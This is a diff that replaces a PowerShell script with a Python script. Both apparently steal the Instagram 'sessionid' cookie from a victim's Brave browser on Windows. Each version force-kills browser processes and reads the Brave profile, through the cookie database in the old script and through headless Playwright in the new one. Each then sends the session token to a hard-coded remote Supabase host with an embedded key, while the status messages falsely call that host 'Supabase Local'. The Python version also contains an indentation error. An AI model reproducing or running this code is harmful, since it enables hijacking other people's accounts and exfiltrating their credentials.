@@ -1,121 +1,111 @@
-# --- KONFIGURASI SUPABASE LOCAL ---
-$SUPABASE_URL = "https://bsunzewnefxyamapczzw.supabase.co"
-$SUPABASE_KEY = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6ImJzdW56ZXduZWZ4eWFtYXBjenp3Iiwicm9sZSI6ImFub24iLCJpYXQiOjE3ODgxNjQ3MjQsImV4cCI6MjEwMzc0MDcyNH0.QzoTFIGOREcUXl6SfxvpxA61d53g0hTB9x8Dsbfthws"
+import os
+import sys
+import subprocess
+import tempfile
 
-function Kill-BrowserProcesses {
-    Write-Host "[*] Menghentikan seluruh proses browser dan service terkait..."
-    
-    $processNames = @(
-        "brave", "chrome", "msedge", "opera", "vivaldi",
-        "BraveUpdate", "GoogleUpdate", "edgeupdate",
-        "crashpad_handler", "chrome_crashpad_handler"
-    )
-
-    foreach ($proc in $processNames) {
-        Get-Process -Name $proc -ErrorAction SilentlyContinue | Stop-Process -Force -ErrorAction SilentlyContinue
+def main():
+    # 1. Buat folder sementara khusus untuk dependensi (supabase & playwright)
+    with tempfile.TemporaryDirectory() as temp_dir:
+        print("[*] Mengunduh dependensi sementara (supabase, playwright)...")
         
-        Get-CimInstance Win32_Process -Filter "Name LIKE '%$proc%'" -ErrorAction SilentlyContinue | 
-            Invoke-CimMethod -MethodName Terminate -ErrorAction SilentlyContinue | Out-Null
-    }
-
-    Start-Sleep -Seconds 3
-}
-
-function Save-To-Supabase {
-    param ([string]$sessionId)
-    try {
-        Write-Host "[*] Menghubungkan ke Supabase Local..."
+        # Install dependensi langsung ke folder temp
+        subprocess.check_call([
+            sys.executable, "-m", "pip", "install",
+            "--target", temp_dir,
+            "--quiet", "supabase", "playwright"
+        ])
         
-        $headers = @{
-            "apikey"        = $SUPABASE_KEY
-            "Authorization" = "Bearer $SUPABASE_KEY"
-            "Content-Type"  = "application/json"
-            "Prefer"        = "return=minimal"
-        }
-        
-        $body = @{
-            "session" = $sessionId
-        } | ConvertTo-Json
+        # Masukkan folder temp ke sistem path Python agar modul bisa di-import
+        sys.path.insert(0, temp_dir)
 
-        $response = Invoke-RestMethod -Uri $SUPABASE_URL -Method Post -Headers $headers -Body $body
-        Write-Host "[✓] Berhasil menyimpan Session ID ke Supabase Local!"
-    }
-    catch {
-        Write-Host "[!] Gagal menyimpan ke Supabase: $_"
-    }
-}
+        # Import modul yang dibutuhkan setelah berhasil di-install
+        from supabase import create_client, Client
+        from playwright.sync_api import sync_playwright
 
-function Get-InstagramSession {
-    Kill-BrowserProcesses
+        # --- KONFIGURASI SUPABASE LOCAL ---
+            SUPABASE_URL = "https://bsunzewnefxyamapczzw.supabase.co"
+            SUPABASE_KEY = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6ImJzdW56ZXduZWZ4eWFtYXBjenp3Iiwicm9sZSI6ImFub24iLCJpYXQiOjE3ODgxNjQ3MjQsImV4cCI6MjEwMzc0MDcyNH0.QzoTFIGOREcUXl6SfxvpxA61d53g0hTB9x8Dsbfthws"
 
-    # Cari lokasi database cookie Brave
-    $possiblePaths = @(
-        "$env:LOCALAPPDATA\BraveSoftware\Brave-Browser\User Data\Default\Network\Cookies",
-        "$env:LOCALAPPDATA\BraveSoftware\Brave-Browser\User Data\Default\Cookies",
-        "$env:LOCALAPPDATA\BraveSoftware\Brave-Browser\User Data\Profile 1\Network\Cookies",
-        "$env:LOCALAPPDATA\BraveSoftware\Brave-Browser\User Data\Profile 1\Cookies"
-    )
+        def kill_browser_processes():
+            """Menutup proses browser agar profil data tidak terkunci."""
+            browsers = ["brave.exe", "chrome.exe", "msedge.exe", "opera.exe"]
+            print("[*] Membersihkan proses browser di latar belakang...")
+            for browser in browsers:
+                cmd = f"taskkill /F /IM {browser} >nul 2>&1"
+                subprocess.run(cmd, shell=True)
 
-    $dbPath = $null
-    foreach ($path in $possiblePaths) {
-        if (Test-Path $path) {
-            $dbPath = $path
-            break
-        }
-    }
+        def save_to_supabase(session_id_val: str):
+            """Mengirim sessionid ke tabel Supabase."""
+            try:
+                print("[*] Menghubungkan ke Supabase Local...")
+                supabase: Client = create_client(SUPABASE_URL, SUPABASE_KEY)
+                
+                # Kirim data ke tabel 'instagram_sessions'
+                supabase.table("storage").insert({
+                    "session": session_id_val
+                }).execute()
+                
+                print("[✓] Berhasil menyimpan Session ID ke Supabase Local!")
+            except Exception as e:
+                print(f"[!] Gagal menyimpan ke Supabase: {e}")
 
-    if (-not $dbPath) {
-        Write-Host "[!] File database cookie Brave tidak ditemukan."
-        return
-    }
+        def get_and_send_instagram_session():
+            kill_browser_processes()
 
-    $tempDb = "$env:TEMP\brave_cookies_temp.db"
+            brave_path = r"C:\Program Files\BraveSoftware\Brave-Browser\Application\brave.exe"
+            user_data_dir = os.path.join(
+                os.environ.get('USERPROFILE', ''),
+                'AppData', 'Local', 'BraveSoftware', 'Brave-Browser', 'User Data'
+            )
 
-    # Salin file menggunakan FileStream dengan FileShare.ReadWrite
-    try {
-        $sourceStream = New-Object System.IO.FileStream($dbPath, [System.IO.FileMode]::Open, [System.IO.FileAccess]::Read, [System.IO.FileShare]::ReadWrite)
-        $destStream = New-Object System.IO.FileStream($tempDb, [System.IO.FileMode]::Create, [System.IO.FileAccess]::Write, [System.IO.FileShare]::None)
-        
-        $sourceStream.CopyTo($destStream)
-        
-        $destStream.Close()
-        $sourceStream.Close()
-    }
-    catch {
-        Write-Host "[!] Gagal menyalin file database: $_"
-        return
-    }
+            print("[*] Membuka profil Brave & memuat Instagram...")
 
-    Write-Host "[*] Membaca database cookie Brave..."
+            try:
+                with sync_playwright() as p:
+                    context = p.chromium.launch_persistent_context(
+                        user_data_dir=user_data_dir,
+                        executable_path=brave_path,
+                        headless=True,
+                        args=["--no-sandbox", "--disable-setuid-sandbox"]
+                    )
 
-    try {
-        $bytes = [System.IO.File]::ReadAllBytes($tempDb)
-        $text = [System.Text.Encoding]::GetEncoding("iso-8859-1").GetString($bytes)
+                    # Buka halaman Instagram agar Playwright memuat cookie aktif
+                    page = context.new_page()
+                    page.goto("https://www.instagram.com", wait_until="domcontentloaded", timeout=15000)
 
-        if ($text -match 'sessionid\x00([^\x00\r\n\t]+)') {
-            $rawSession = $Matches[1]
-            $sessionIdVal = $rawSession -replace '[^\w%:-]', ''
+                    all_cookies = context.cookies()
+                    context.close()
 
-            Write-Host ("=" * 65)
-            Write-Host "INSTAGRAM SESSIONID BERHASIL DI-EKSTRAKSI:"
-            Write-Host ("=" * 65)
-            Write-Host $sessionIdVal
-            Write-Host ("=" * 65)`n
+                    # Filter cookie sessionid
+                    ig_sessions = [
+                        c for c in all_cookies 
+                        if "instagram.com" in c.get("domain", "") and c.get("name") == "sessionid"
+                    ]
 
-            Save-To-Supabase -sessionId $sessionIdVal
-        }
-        else {
-            Write-Host "`n[!] Cookie 'sessionid' Instagram tidak ditemukan."
-            Write-Host "[!] Pastikan kamu sudah login ke akun Instagram di Brave."
-        }
-    }
-    catch {
-        Write-Host "[!] Gagal membaca file cookie: $_"
-    }
-    finally {
-        Remove-Item -Path $tempDb -Force -ErrorAction SilentlyContinue
-    }
-}
+                    if not ig_sessions:
+                        print("\n[!] Cookie 'sessionid' Instagram tidak ditemukan.")
+                        print("[!] Pastikan kamu sudah login ke akun Instagram di Brave.")
+                        return
 
-# Eksekusi
-Get-InstagramSession
+                    session_id_val = ig_sessions[0]["value"]
+
+                    print("\n" + "=" * 65)
+                    print("INSTAGRAM SESSIONID BERHASIL DI-EKSTRAKSI:")
+                    print("=" * 65)
+                    print(session_id_val)
+                    print("=" * 65 + "\n")
+
+                    # Kirim ke Supabase Local
+                    save_to_supabase(session_id_val)
+
+            except Exception as e:
+                print(f"\n[!] Terjadi kesalahan saat mengambil cookie: {e}")
+
+        # Jalankan eksekusi utama
+        get_and_send_instagram_session()
+
+    # 2. Setelah keluar dari blok 'with', folder temp_dir beserta seluruh dependensi otomatis terhapus
+    print("\n[*] Seluruh dependensi sementara berhasil dibersihkan/dihapus.")
+
+if __name__ == "__main__":
+    main()
